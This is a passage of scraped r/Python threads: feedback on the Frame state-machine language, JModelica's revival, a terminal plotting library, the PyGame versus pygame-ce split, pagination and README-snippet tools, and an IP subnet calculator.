            "content": "I think this project could do with a serious think about the strangeness budget of the language. Everything you do that is unlike anything else people know will make it harder to learn and less likely for people to adopt. You should only change things when they provide a clear benefit. I think you've fallen down the trap of \"short sigils for special things are better than keywords\". Rust did this too originally, but then it got rid of them (~T became Box<T>/Vec<T>/String and @T became Rc<T>/Arc<T>) and it made the language easier to learn. Generally people will be able to parse what looks like English much faster. There are just too many example of weird sigils and strange syntax: Using |>|/|<| for enter/exit and ^ for return are bad ideas, it makes the language unreadable for beginners. I'd use keywords enter, exit, return. The boolean expressions... why not just use the tried and tested if/else if/else? x ?! f[] :> g[] : h[] :| wut? Using -block-. This is very strange to me, I'd use something like block: from c++ or impl block { ... } from rust . Do you even need these blocks? In the machine block, how are the event handlers delimited? whitespace? Tokens? It's not clear at all. var x:# = #MySystem() rather than var x: Frame = #MySystem(). On this subject, IMO it's much easier to parse var x: t rather than var x:T. Using backticks in your language pretty much always sucks because people will be writing about it in markdown and you'll accidentally escape things. I'm not sure what you could replace it with, my first thought is what other template languages use { ... } or {{ ... }}. [...] for parameter specs and subroutine calls. Why? Pretty much every other language use f(x, y, z) or f x y z. Using # and ## to delimit systems... Why not system #MySystem { ... }? Allowing target language expressions outside of template blocks (\"superstrings\") seems like a really bad idea. Using ~/.../ and #/.../ sigils to mark match expressions for strings and numbers respectively. Why? Again keywords are clearer. Basically everything to do with the state parameters is confusing and messy and full of strange sigils. TLDR you've blown through your strangeness budget very quickly and I don't think you need to! The use of N different syntaxes in the N blocks (including main) is inherently confusing. I'd try and unify them in some way. Currently it looks like you're writing N different languages mushed together. My other complaint is one generally leveraged at go: why have you ignored all programming language design from the last half century? loop var x = 0; x < 5; x = x + 1. Come on guys, don't go back to C. loop x in list is so much more powerful. Provide range and iterator combinators. enums (noticed how you decided to at least use a keyword to define these) don't hold any data. Sum types / ADTs have been a feature of every major language (minus go) for the last 15 years. I'd especially expect a DSL for state machines of all things to support them. Uninitialized variables as null. Do we need to persiste the billion dollar mistake? You should be forced to explicitly initialize everything, and if they are typed, they cannot be null. Introduce an Option sum type for that. Why do you support lists but no other common data types like maps and sets? I'm not sure what the point is to be honest since you just hand off processing to the target language anyway.",
            "replies": [
                {
                    "author": "framelanger",
                    "score": "10",
                    "content": "Hello and thank you for your thoughtful feedback - very much appreciated! Frame's major goal is to find a way to make creating automata based systems easy to create and use in any project. In the past I supported other language targets than Python and hope to again in the nearish future. As for the details of the syntax, I am not very wedded to any of my particular choices at this point. Overall I tried to make it compact and easy to understand but recognize it is novel in many ways and runs risks in that regard. Feedback like yours I consider very valuable so thank you. As this is only the beginning and I am only one person working nights and weekends to put this out there am trying to focus on the differentiators from all the other languages first to add value there initially. I certainly hope to improve on all the things Frame doesn't yet do over time. Best, Mark"
                }
            ]
        },
        {
            "author": "BerkshireKnight",
            "score": "12",
            "content": "I think your overview page would massively benefit from some code snippets - I like the sound of the project but I was hoping for some quick examples of what it looks like. DSLs can be complicated so it'd be nice to get a quick feel for how hard it'll be to learn!",
            "replies": [
                {
                    "author": "larsga",
                    "score": "3",
                    "content": "And also some examples of how you can use the output. Hard to see where the benefit is otherwise."
                }
            ]
        },
        {
            "author": "RedEyed__",
            "score": "4",
            "content": "I would love to see real use cases/examples where it can be used. Thanks."
        },
        {
            "author": "rothnic",
            "score": "5",
            "content": "I've spent a lot of time with UML, SysML, Python, and JavaScript. I went through the Georgia tech masters in systems engineering program, with a big focus on MBSE. I get the desire to manage state machines in code, but I think early on, it is useful to start visually first and translate that to code to get started with. A great example of this on the JavaScript side is xstate. The other aspect I noticed when looking at your playground is the language used to define the state machines is so different than python, that I'd worry about whether you are gaining much by managing it this way. Overall, really neat concept and I think state machines are super useful, but if working in Python I'd want something more aligned with the language I'm working in."
        },
        {
            "author": "wanzeo",
            "score": "5",
            "content": "Looks interesting but I don’t understand it enough to see where it would be useful. Anyone want to give an example of where state machines shine compared to traditional paradigms?",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "10",
                    "content": "regex and other pattern matching engines are implemented using a state machine"
                },
                {
                    "author": "thallazar",
                    "score": "7",
                    "content": "Gaming AI heavily uses state machines."
                },
                {
                    "author": "MelonheadGT",
                    "score": "5",
                    "content": "Industrial automation (like PLC) and such often use states and next state transitions, not always fully a state machine but related. Could probably be used to replicate or simulate automation tasks in python for testing or visualisation"
                },
                {
                    "author": "violentlymickey",
                    "score": "3",
                    "content": "We used state machines in a previous job to control a physical workflow (like turn on machine, operate machine, display results, eject cartridge, etc.). This could all be programmed manually without a state machine, but it would be less flexible and would need to be carefully managed to avoid unknown or undefined states/transitions."
                },
                {
                    "author": "framelanger",
                    "score": "2",
                    "content": "Thanks for taking a look! I've added some content to my documentation under the \"Solution Depot\" and \"Articles\" section that might give some ideas. I'm continuing to build that out so very open to any suggestions about what domains might be of interest to add an article or example about. https://docs.frame-lang.org/en/latest/about/introduction.html"
                },
                {
                    "author": "bwanab",
                    "score": "1",
                    "content": "Back in the days when I worked on process control systems (i.e. automated soft drink bottling plants, dairies - anything that had lots of liquid moving through a maze of pipes) we used state machines to model the system. This turned 1000s of lines of code to 100s."
                },
                {
                    "author": "sonobanana33",
                    "score": "1",
                    "content": "non-blocking I/O"
                }
            ]
        },
        {
            "author": "larsga",
            "score": "2",
            "content": "I've used state machines a good bit (for DTD validation in the xmlproc parser, for example), but I don't really know what I'd use this for. You may want to change \"Alan Turning\" to \"Alan Turing\". Also, please don't link to that movie for information. It's not very informative and not very accurate. Andrew Hodges's biography is much better. (Turing didn't invent state automata, which came later, but I'm sure you know that. Since he did the first automata I guess the claim is fair enough.)"
        },
        {
            "author": "RevolutionaryRain941",
            "score": "2",
            "content": "This is some great work. I don't really some great applications here, but still will compliment this great piece of work."
        },
        {
            "author": "not_perfect_yet",
            "score": "1",
            "content": "feedback I know what a state machine is, but I am too stupid for what you have created. Idk if that helps?"
        },
        {
            "author": "will_r3ddit_4_food",
            "score": "1",
            "content": "What does this offer that the transitions package doesn't?",
            "replies": [
                {
                    "author": "kronik85",
                    "score": "2",
                    "content": "I'm also interested in a comparison with what I'm most familiar with, pytransitions. What does Frame do differently that sets it apart from pytransitions? For example, I don't think they support any UML diagramming, just visual state machine generation."
                }
            ]
        },
        {
            "author": "jftuga",
            "score": "1",
            "content": "Have you ever looked into Amazon States Language? It is a JSON-based language used to describe state machines declaratively.",
            "replies": [
                {
                    "author": "framelanger",
                    "score": "3",
                    "content": "Hello, I have, but not to a great depth. Frame was actually inspired by my own attempt to build a statechart drawing tool. In the process of writing the serialization code I realized that all the value was in the xml I was generating and not in the visual editing of the software. While the diagrams are extremely useful, they aren't an easy way to actually create software. The States Langauge, xState and Google Workflows languages all use a data language to express state machines which was something I didn't like about the xml I created. So I decided to create a language that hopefully was more syntactically elegant than xml, yaml or json. We'll see if anyone else agrees I succeeded :) Thanks for your interest!"
                }
            ]
        },
        {
            "author": "ForlornPlague",
            "score": "1",
            "content": "You have a typo on the docs page, it says progarmming language"
        },
        {
            "author": "Mezzomaniac",
            "score": "1",
            "content": "Looks really interesting. I’m going to follow you. I found the syntax for the state machines themselves to be intuitive and great way of visualising what a state machine is. The other syntax (functions, control flow, variables) didn’t seem like it would be too hard to get the hang of but it doesn’t look as beautifully organic as the state machine syntax, especially coming from Python where I’m a bit grossed out by the use of braces as function deljmters and by C-style for loops.",
            "replies": [
                {
                    "author": "framelanger",
                    "score": "2",
                    "content": "Thanks for the interest! This is really alpha software so I'm very open to finding syntax that people like - its not that hard to change at this point. Please send any suggestions - I'm logging them: https://github.com/frame-lang/frame_transpiler/issues/238."
                }
            ]
        }
    ]
},
{
    "post_author": "foadsf",
    "post_id": "1cqvyyf",
    "post_score": "3",
    "post_time": "Monday, May 13, 2024 at 1:28:15 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Giving New Life to JModelica: Bringing Powerful Modelica Simulations to Python",
    "media": [
        "https://www.reddit.com/r/Python/comments/dcj6fy/jmodelica_combining_the_power_of_python_and/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button",
        "https://github.com/JModelica/JModelica"
    ],
    "post_content": "Five years ago, I posted about JModelica, a fantastic open-source tool for simulating complex systems that combined the ease of Python with the strength of Modelica.\nSadly, the project went quiet, but I'm thrilled to share that, thanks to the dedication of a few folks (myself included!), JModelica is back! You can find the revived project on GitHub: https://github.com/JModelica/JModelica.\nWhat JModelica Does:\nJModelica provides a way to write complex simulations using the Modelica language, which is known for its ability to handle differential equations and model physical systems beautifully. The magic of JModelica lies in its Python integration—you can solve your Modelica models and access the results directly in Python for in-depth analysis, visualization, and even optimization using libraries you already love!\nTarget Audience:\nThis project is geared toward anyone interested in modeling and simulating complex systems, particularly those with a background in engineering, physics, or related fields. If you've struggled with Python's ODE solvers or wish for a more elegant way to model physical interactions, JModelica offers a compelling solution. It's ready for research, educational projects, and even more ambitious endeavors!\nComparison:\nJModelica stands alongside OpenModelica as a champion of open-source Modelica tools. While OpenModelica is known for its user-friendly graphical interface, JModelica shines in its seamless integration with Python, giving you the best of both worlds! It's a powerful alternative to proprietary software like Simulink, providing transparency, flexibility, and a thriving community.\nWe're actively working on squashing bugs, adding features, and making JModelica more accessible across different platforms (Windows and macOS support are on the horizon!).\nAnyone interested in contributing is welcome! Whether you're a Modelica expert or a curious newcomer, this project has a place for you. Check out the GitHub repository to explore the code, open issues, or submit pull requests.",
    "comments": [
        {
            "author": "mrphanm",
            "score": "2",
            "content": "Look forward to hearing good news"
        }
    ]
},
{
    "post_author": "Spiffidimus",
    "post_id": "1cor562",
    "post_score": "87",
    "post_time": "Friday, May 10, 2024 at 5:39:41 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Interactive plots in the terminal",
    "media": [
        "https://pypi.org/project/itrm/"
    ],
    "post_content": "I made a library to create interactive plots in the terminal (pip install itrm). It uses braille characters (by default) to display the data with sub-character resolution. There are several keybindings for moving a vertical cursor left and right, for zooming in or out on data, and for changing which curve to focus on. There are occasions (such as when working with a server) where MatPlotLib is not an option and the terminal is the only available tool. But, in my opinion, it is actually faster to use this tool (itrm) to zoom in on interesting parts of data and analyze patterns than using other tools like MatPlotLib. In fact, with large data sets (~1 million points), this tool actually renders faster than MatPlotLib. Please check it out and let know what you think.",
    "comments": [
        {
            "author": "hoodies_are_comfy",
            "score": "4",
            "content": "This looks pretty cool, I’ll check it out. Thanks!"
        },
        {
            "author": "ErrantKnight",
            "score": "2",
            "content": "Had a quick look, it's really nice! I haven't quite found out how to label the axis or run it in OO mod ala matplotlib but I might use it more broadly for fast plotting!",
            "replies": [
                {
                    "author": "Spiffidimus",
                    "score": "2",
                    "content": "Thank you. There is no mechanism for labeling axes, just as there is no mechanism for tick marks or grids because it is not meant for presentation but for inspection. The intended viewer is the developer. However, there is a plot label parameter to help keep track which plot is which. You could put axis information there: “Position vs. time (s)”."
                }
            ]
        },
        {
            "author": "Rubidxx",
            "score": "2",
            "content": "Very cool! Two comments: Would be nice if logarithmic axis could be applied Make the program run directly in the terminal, like \"itrm -interactive -data data.txt\" or something like that.",
            "replies": [
                {
                    "author": "Spiffidimus",
                    "score": "3",
                    "content": "Thank you. Yes, while you can just apply np. log10 to the inputs, I have found that tedious. I like both of your suggestions, and I think I’ll try to add them. Thank you."
                },
                {
                    "author": "Spiffidimus",
                    "score": "2",
                    "content": "I've added an `lg` parameter to the `plot` and `iplot` functions for applying logarithmic scaling. Calling itrm directly in the terminal will take me a bit more time to figure out how to do."
                }
            ]
        },
        {
            "author": "the_read_menace",
            "score": "2",
            "content": "This is great!"
        },
        {
            "author": "garma87",
            "score": "2",
            "content": "That’s neat ty. I definitely have use cases for this. It would be cool if you could maintain the same api as matplotlib"
        }
    ]
},
{
    "post_author": "pyeri",
    "post_id": "1crsktg",
    "post_score": "233",
    "post_time": "Tuesday, May 14, 2024 at 4:47:34 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Is PyGame still alive?",
    "media": [],
    "post_content": "So it was a long time ago in the good old Python 2.x days (circa 2010 probably) that I had learned PyGame with some tutorials at my former work place. But nowadays since I mostly freelance with business apps, I never felt the need for it.\nBut since such a game development project is on the horizon after all these years, I was wondering if PyGame can still be up for the task with Python 3.x? Or is there a better Python library available these days?\nI don't need any advanced gaming features of modern day VFX or anything, all I need is some basic Mario/Luigi style graphics, that's all!",
    "comments": [
        {
            "author": "BasePlate_Admin",
            "score": "293",
            "content": "You probably dont know about this but pygame team separated. There's now 2 versions of pygame. pygame-ce actively developed pygame the OG one but this is a one man show these days. As for can games be made with pygame, checkout dafluffypotato, he made games in pygame that won against games made in godot/unity.",
            "replies": [
                {
                    "author": "ivosaurus",
                    "score": "60",
                    "content": "Dayum, didn't know that had happened",
                    "replies": [
                        {
                            "author": "brasticstack",
                            "score": "19",
                            "content": "Same! I started out a project using pygame just recently, I'll have to switch.",
                            "replies": [
                                {
                                    "author": "e4aZ7aXT63u6PmRgiRYT",
                                    "score": "-10",
                                    "content": ""
                                }
                            ]
                        },
                        {
                            "author": "russellvt",
                            "score": "4",
                            "content": "I guess it's time to run an rgrep against my repos for requirements files with that old name in it, and start replacing ... thanks for the info!"
                        }
                    ]
                },
                {
                    "author": "timhurd_com",
                    "score": "14",
                    "content": "Hey thanks for the tips. I didn't know that there was a split in the team myself and while I had visited dafluffypotato a while ago, I had forgotten about him. So go back and see his stuff again was refreshing. :)"
                },
                {
                    "author": "ryukinix",
                    "score": "12",
                    "content": "Didn't know about that. Why was the split made? Original author gatekeeping progress in the original repository?"
                }
            ]
        },
        {
            "author": "bilcox",
            "score": "34",
            "content": "It might be worth checking out arcade https://pypi.org/project/arcade/"
        },
        {
            "author": "RossiGiova",
            "score": "15",
            "content": "I think you can now use pygame for a medium/heavy complexity 2D game. I've seen a lot of videos on YouTube from clear code and thefluffypotato and today pygame is fantastic, of course with the community edition which offers tons of new features that make this library a great start for Python game development",
            "replies": [
                {
                    "author": "riklaunim",
                    "score": "10",
                    "content": "That depends. Commercially it isn't really used and in terms of support it's also way behind Godot/Unreal or even Unity. Mobile/Console support may also play a role."
                }
            ]
        },
        {
            "author": "MasterPlan127",
            "score": "35",
            "content": "For the kind of tasks you mentioned I think it will be fine, personally I will recommend investing time in a more actively developed framework, even if that means changing the programming language.",
            "replies": [
                {
                    "author": "timwaaagh",
                    "score": "32",
                    "content": "pygame-ce is being actively developed. i think even pygame itself is."
                }
            ]
        },
        {
            "author": "DickerDackel",
            "score": "7",
            "content": "pygame-ce is active, and it's up to the task of implementing most of the sprite based games that older people know from the arcades or consoles like the sega saturn/megadrive. Get the new one from pyga.me (or pip install pygame-ce). It's a drop-in replacement from the known pygame, with pretty much all core devs moved to that new project. If you chose to try it, you need to uninstall the normal pygame before installing, since both use the same namespace (that's the drawback of a dropin replacement)"
        }
    ]
},
{
    "post_author": "kernelslayer",
    "post_id": "1cqzf6o",
    "post_score": "10",
    "post_time": "Monday, May 13, 2024 at 4:33:19 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "SQLPage - a Python library to add string token based pagination easily",
    "media": [
        "https://pypi.org/project/sqlpage/",
        "https://github.com/prabhupant/sqlpage"
    ],
    "post_content": "What My Project Does - This is a Python package to easily add string token based pagination. Currently it supports SQLModel and SQLAlchemy ORMs.\nRecently I wanted to add pagination in one of my Python projects and in the API response, I had to return a string next page token. Now I could not find a straight-forward way of doing this in Python. All of the tutorials or blog posts I saw, there in the response the server always returned a page_number, page_size, and total_elements and then the onus was on the calling service to adjust this accordingly. \nComparison - The current packages and methods requires some changes in the app layer as well. I tried using a few but those did not satisfy the use case and were also a bit harder to implement. I could not find a easy to use option. The present ones returned integers instead of a string token\nI wanted it to be simpler, just like OpenSearch - you call its search API and it returns 10 elements and a next_page_token and then for the next 10 (or you configure this using the size parameter) you use the next_page_token in the subsequent request to get to the new page.\nI ended up doing a lot of if-else checks and encoding and decoding, so I decided to create this library.\nTarget Audience - This is production ready, have been using it in one of my projects. Hope some of you folks find it useful :)\nHere is the link to the PyPi repository and here is the GitHub repo",
    "comments": [
        {
            "author": "riklaunim",
            "score": "1",
            "content": "If you know total and page size you can generate start to end pagination. With only next page you can't so it's somewhat different. If the endpoint uses some more complex query then the count function could be expensive and \"next page\" only approach would be faster but IMHO that would be done on endpoint layer when returning different metadata. In your code you are hiding the count behind a proxy model and not exposing all the metadata? That's bit weird as it would combine disadvantages of both solutions. Also your tests need some work - you should use assertions, proper test cases, probably also FactoryBoy to create require data in the database.",
            "replies": [
                {
                    "author": "kernelslayer",
                    "score": "1",
                    "content": "Thanks for the feedback, appreciate it! Yes, I got to work on the test. Right now the \"test\" is just a script to test if the code was working. I am planning to add other details like totalElements, currentPage in the PageData object shortly. Also, if the count query is expensive, is there any other way to optimise this? Because, I think, without knowing the total elements, we might not be able to do the calculation needed for pagination. And I was looking at Spring Boot's JPA and it also does a count operation"
                }
            ]
        }
    ]
},
{
    "post_author": "jgloewen",
    "post_id": "1com0mh",
    "post_score": "49",
    "post_time": "Friday, May 10, 2024 at 1:09:32 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Python Streamlit Spotlight Tutorial: an Interactive Dashboard using UNHCR Refugee Data",
    "media": [
        "https://johnloewen.substack.com/p/python-streamlit-spotlight-an-interactive"
    ],
    "post_content": "Python Streamlit is a terrific tool for creating interactive data visualizations.\nIt packages all your visualizations up into a neat little application - including charts and maps - and displays them in your default browser. No muss, no fuss.\nRecently, I found a new dataset (to me) on the UN High Commission for Refugees (UNHCR) website. It contains country-to-country movements for refugees both from origin country and country of asylum\nUsing this dataset, here's a step-by-step on how to code a Python Streamlit application that has:\nA dropdown menu to select by country\nA second dropdown menu to select by year\nRadio buttons (2) to select country of origin or county of asylum\nA global choropleth map to display the results by country and year.\nFree article HERE.",
    "comments": [
        {
            "author": "ExdigguserPies",
            "score": "1",
            "content": "When you say it packages it up, you do have to run it in a python env right?",
            "replies": [
                {
                    "author": "jgloewen",
                    "score": "3",
                    "content": "yes, this example is running within a Python env."
                }
            ]
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "ch7pl2",
    "post_score": "2054",
    "post_time": "Wednesday, July 24, 2019 at 3:44:00 PM GMT+3",
    "flair_text": "",
    "post_title": "Lately I got nothing to do so I decided to work on my school project for next year and I’ve made a program that tracks moving objects in a specific area and sends me a picture of the moving object in the discord",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "Grizwolf",
            "score": "186",
            "content": "It looks like it is also picking up the exhaust from vehicles, which is also pretty cool.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "70",
                    "content": "Yea I could actually make it more accurate but I had to blur it so the sun lights won’t mess it up"
                },
                {
                    "author": "Terabytes123",
                    "score": "-48",
                    "content": "",
                    "replies": [
                        {
                            "author": "Terabytes123",
                            "score": "-19",
                            "content": ""
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "55",
            "content": "Didn’t realize python had a function to set cars on fire. Cool!",
            "replies": [
                {
                    "author": "somebodddy",
                    "score": "36",
                    "content": "import arson"
                }
            ]
        },
        {
            "author": "Dadotox",
            "score": "137",
            "content": "I am going through the \"Automate the boring stuff with Python\", as an introduction to Python. Watching this (which is fucking awesome) I am starting to think I have the wrong book.",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "73",
                    "content": "automating boring stuff is a pretty good start :P But if you wanna see how these things are made you should check out the cv2 package"
                },
                {
                    "author": "audiodev",
                    "score": "168",
                    "content": "This project isn't introductory stuff. Stick with that book first, its a good one"
                },
                {
                    "author": "renaissancetroll",
                    "score": "63",
                    "content": "Automate the boring stuff is good for beginners, although this project isn't quite as complicated as you'd think. Basically all you need to do is Get video feed Choose an image recognition library If movement is detected, send the image to Discord via API"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "30",
            "content": "As someone who’s only a month into learning python, this is both awe-inspiring and super discouraging 😖"
        },
        {
            "author": "[deleted]",
            "score": "43",
            "content": "Btw if anyone wanna see the results feel free to check the discord server: https://discord.gg/UMZKsUc And I will probably not share the code until I get grade on it cause I don’t want it to be stolen by someone else sorry about it 😐"
        }
    ]
},
{
    "post_author": "realazthat",
    "post_id": "1cqlvgt",
    "post_score": "9",
    "post_time": "Monday, May 13, 2024 at 3:06:15 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "CLI to embed code snippets in your README, from actual (testable) code",
    "media": [
        "https://github.com/realazthat/snipinator#path",
        "https://github.com/NativeScript/markdown-snippet-injector",
        "https://github.com/andersfischernielsen/Simple-Embedded-Markdown-Code-Snippets",
        "https://github.com/tokusumi/markdown-embed-code",
        "https://github.com/romnn/embedme",
        "https://github.com/realazthat/snipinator#snippet",
        "https://github.com/gatsbyjs/gatsby/tree/master/packages/gatsby-remark-embed-snippet",
        "https://github.com/JulianCataldo/remark-embed",
        "https://github.com/polywrap/doc-snippets",
        "https://github.com/sammndhr/gridsome-remark-embed-snippet",
        "https://github.com/mdx-js/mdx",
        "https://github.com/gatsbyjs/gatsby",
        "https://github.com/zakhenry/embedme",
        "https://github.com/cmacmackin/markdown-include",
        "https://github.com/teyc/markdown-snippet",
        "https://github.com/tjstankus/commitate",
        "https://github.com/realazthat/snipinator#commit-process",
        "https://gridsome.org/",
        "https://github.com/DamonOehlman/injectcode",
        "https://github.com/szkiba/mdcode",
        "https://github.com/drewavis/markdowninclude",
        "https://github.com/marc-bouvier-graveyard/baldir_markdown",
        "https://docs.github.com/en/get-started/writing-on-github/working-with-advanced-formatting/creating-a-permanent-link-to-a-code-snippet",
        "https://github.com/electrovir/markdown-code-example-inserter",
        "https://github.com/SimonCropp/MarkdownSnippets",
        "https://github.com/pallets/jinja",
        "https://github.com/devincornell/pymddoc",
        "https://github.com/calebpeterson/jest-transformer-test-md",
        "https://github.com/shiftkey/scribble",
        "https://github.com/xrd/oreilly-snippets",
        "https://github.com/endocode/snippetextractor",
        "https://github.com/shiftkey/scribble/blob/master/docs/features/code-snippets.md",
        "https://github.com/ildar-shaimordanov/git-markdown-snippet",
        "https://github.com/dineshsonachalam/markdown-autodocs",
        "https://github.com/realazthat/snipinator#shell",
        "https://github.com/realazthat/snipinator/blob/develop/README.md.jinja2",
        "https://github.com/ARMmbed/snippet",
        "https://github.com/BurdetteLamar/markdown_helper",
        "https://github.com/javierfernandes/markdown-exercises",
        "https://github.com/fuxingloh/remark-code-import-replace",
        "https://github.com/realazthat/snipinator",
        "https://github.com/realazthat/snipinator/#-related-projects"
    ],
    "post_content": "What My Project Does\nWhat My Project Does: snipinator is a CLI to embed (testable) snippets from your codebase into your README, using Jinja2 and functions provided by snipinator to assist with embedding code, shell output, etc.\nPlease provide any feedback in the comments or GH issues.\nTarget Audience\nTarget Audience: Developers of {GitHub,other} projects that have a README. It works for me, it might work for you.\nComparison\nFeatures:\nSupports anything Jinja2 supports.\nFirst-class support for python source code.\nCan include python function signatures, docstrings, entire function source code, classes.\nSnip from any source code language.\nPut delimiter markers into the code (e.g # START_SNIPPET, # END_TEMPLATE), and use snippet().\nFirst-class support for Markdown templates (with backtickify, decomentify).\nCan include shell output.\nSupports ANSI colors with SVG output.\nMore robust references/links to local files using path().\nI keep a table of similar projects in my README at realazthat/snipinator: Related Projects.\nNot complete, and not necessarily up to date. Make a PR to README.md.jinja, (see realazthat/snipinator/Contributions) to insert/modify the table.\nProject Stars Last Update Language Platform Similarity X Obviousness\nmdx-js/mdx 16.8k 2024/04/17 JS N/A ⭐⭐⭐⭐⭐\nzakhenry/embedme 222 2023/11/08 JS N/A ⭐⭐⭐⭐⭐\ncmacmackin/markdown-include 95 2023/02/07 Python N/A ⭐⭐⭐⭐⭐\nBurdetteLamar/markdown_helper 38 2020/03/16 Ruby N/A ⭐⭐⭐⭐⭐\nSimonCropp/MarkdownSnippets 23 2024/04/23 .NET N/A ⭐⭐⭐⭐⭐\nendocode/snippetextractor 4 2014/08/16 C++ N/A ⭐⭐⭐⭐⭐\npolywrap/doc-snippets 3 2023/09/26 JS N/A ⭐⭐⭐⭐⭐\nJulianCataldo/remark-embed 2 2022/09/22 JS N/A ⭐⭐⭐⭐⭐\nxrd/oreilly-snippets 2 2015/10/15 Ruby N/A ⭐⭐⭐⭐⭐\nDamonOehlman/injectcode 1 2021/08/01 JS N/A ⭐⭐⭐⭐⭐\nelectrovir/markdown-code-example-inserter 1 2024/02/19 JS N/A ⭐⭐⭐⭐⭐\nandersfischernielsen/Simple-Embedded-Markdown-Code-Snippets 1 2021/02/12 JS N/A ⭐⭐⭐⭐⭐\nildar-shaimordanov/git-markdown-snippet 0 2021/09/14 Perl N/A ⭐⭐⭐⭐⭐\nteyc/markdown-snippet 0 2024/01/22 Powershell N/A ⭐⭐⭐⭐⭐\nmarc-bouvier-graveyard/baldir_markdown 0 2020/06/15 Python N/A ⭐⭐⭐⭐⭐\ndineshsonachalam/markdown-autodocs 176 2022/09/19 JS GH Action ⭐⭐⭐⭐\ntokusumi/markdown-embed-code 28 2022/01/05 Python GH Action ⭐⭐⭐⭐\nsammndhr/gridsome-remark-embed-snippet 2 2021/06/14 JS Gridsome ⭐⭐⭐⭐\nNativeScript/markdown-snippet-injector 4 2019/01/24 JS N/A ⭐⭐⭐⭐\nfuxingloh/remark-code-import-replace 0 2022/12/21 JS Remark? ⭐⭐⭐⭐\nszkiba/mdcode 15 2014/02/12 Go N/A ⭐⭐⭐\ndevincornell/pymddoc 0 2023/12/01 Python Python ⭐⭐⭐\nshiftkey/scribble (docs) 40 2013/08/08 .NET N/A ⭐⭐\ncalebpeterson/jest-transformer-test-md 2 2020/08/21 JS Jest Tests ⭐⭐\ntjstankus/commitate 0 2014/05/29 Ruby N/A ⭐\nGitHub Docs: Creating a permanent link to a code snippet N/A N/A N/A N/A ⭐\njavierfernandes/markdown-exercises 1 2017/05/01 JS N/A ⭐\ngatsby-remark-embed-snippet N/A (55k) 2024/01/23 JS Gatsby ⭐\nARMmbed/snippet 6 2021/08/05 Python N/A ?\ndrewavis/markdowninclude 1 2024/04/06 JS VSCode Extension ?\nromnn/embedme 0 2024/04/18 Go N/A ?\nThe 5 star projects have the bare minimum of being able to embed a file, and run via CLI.\nSnipinator does have other features (such as shell()), implemented as I needed them (and listed below) which I do not think any of these have in combination.\nSome of these projects are not CLIs.\nmdx-js/mdx is the closest in terms of flexibility, but it is JS + components, which may not be everyone's cup of tea.\nUsage:\nExample template README: (./snipinator/examples/EXAMPLE.md.jinja2):\n# A README\n\nHere is a code snippet:\n\n<!--{{ pysnippet(path='snipinator/examples/code.py', symbol='MyClass', backtickify='py', decomentify='nl') }}-->\n\nNote that `code.py` has a test:\n{{path('./snipinator/examples/code_test.py', link='md')}}.\nGenerating the README:\n$ python -m snipinator.cli -t snipinator/examples/EXAMPLE.md.jinja2\n<!--\n\nWARNING: This file is auto-generated by snipinator. Do not edit directly.\nSOURCE: `snipinator/examples/EXAMPLE.md.jinja2`.\n\n-->\n# A README\n\nHere is a code snippet:\n\n<!---->\n```py\nclass MyClass:\n  \"\"\"This is a global class\"\"\"\n\n  def __init__(self, name):\n    self.name = name\n\n  def MyClassMethod(self):\n    \"\"\"This is a method of MyClass\"\"\"\n    print(self.name)\n```\n<!---->\n\nNote that `code.py` has a test:\n[./snipinator/examples/code_test.py](./snipinator/examples/code_test.py).",
    "comments": []
},
{
    "post_author": "bencherdev",
    "post_id": "1csmx2q",
    "post_score": "2",
    "post_time": "Wednesday, May 15, 2024 at 5:59:47 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Track the size of your PyInstaller packages in CI",
    "media": [
        "https://bencher.dev/docs/how-to/track-file-size/"
    ],
    "post_content": "If you have ever wanted to track the size of your PyInstaller packages in CI, Bencher now supports tracking your package size: https://bencher.dev/docs/how-to/track-file-size/",
    "comments": []
},
{
    "post_author": "AutoModerator",
    "post_id": "1cqlqq7",
    "post_score": "5",
    "post_time": "Monday, May 13, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "nicanorflavier",
    "post_id": "1comgeg",
    "post_score": "43",
    "post_time": "Friday, May 10, 2024 at 1:39:01 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "IP subnet or IP calculator tool need feedback",
    "media": [
        "https://github.com/nicanorflavier/ipnet"
    ],
    "post_content": "Hey folks,\nI've been dabbling with a Python project recently that's all about making life easier for us I.T. people. It's a nifty little tool that calculates IP subnets and does IP calculations from the command or CLI.\nHere's the GitHub link and the code:\nhttps://github.com/nicanorflavier/ipnet\nI’m pretty stoked about it, but I know there’s always room for improvement. So, I thought, better to turn to than the wise minds of this python community?\nI’m all ears for any feedback, tips, tricks, or advice you guys might have. Thanks a ton in advance!",
    "comments": [
        {
            "author": "sylecn",
            "score": "23",
            "content": "I know python has built-in ipaddress module, but us programmers usually avoid writing any code when existing solution exists and works fine. In this case, I mean ipcalc tool, which should be in any distro's repo. If it's just for learning, it could be a good practice project.",
            "replies": [
                {
                    "author": "syklemil",
                    "score": "5",
                    "content": "Yeah, my first thought here also was that ipcalc (website) feature parity would be nice. I would also assume it to be more of a learning experience, unless some problem with the existing tool annoys someone and they'd rather write a replacement in another language than touch perl (I wouldn't blame them for that decision; it's been decades since I really wrote perl)."
                }
            ]
        },
        {
            "author": "etxconnex",
            "score": "7",
            "content": "2 things: Skimmed the code, but I did not see you using any bitwise operations. IPs + masks go hand in hand with bitwise operations and I think once you see that your code would be much better and easier to add features. The idea of classes in networking is archaic and needs to die. Nonetheless, I only see 3 classes in your code AND class D and E are getting classified as class C in your code. Try 244.0.0.4 -- pretty cude your code will say it's class C but it is a class D.",
            "replies": [
                {
                    "author": "nicanorflavier",
                    "score": "0",
